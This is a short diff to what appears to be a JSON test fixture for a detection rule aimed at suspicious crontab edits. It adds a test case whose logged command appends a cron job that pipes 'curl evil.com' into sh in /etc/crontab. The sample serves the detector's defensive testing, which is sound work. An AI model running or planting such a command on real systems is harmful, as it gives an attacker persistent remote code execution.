@@ -4,6 +4,10 @@
     {
       "name": "real interactive crontab edit (crontab -e, real zsh shell)",
       "log": {"CommandLine": "crontab -e", "ParentCommandLine": "/bin/zsh"}
+    },
+    {
+      "name": "my own test case",
+      "log": {"CommandLine": "echo '*/5 * * * * curl evil.com|sh' >> /etc/crontab", "ParentCommandLine": "/bin/zsh"}
     }
   ],
   "true_negatives": [
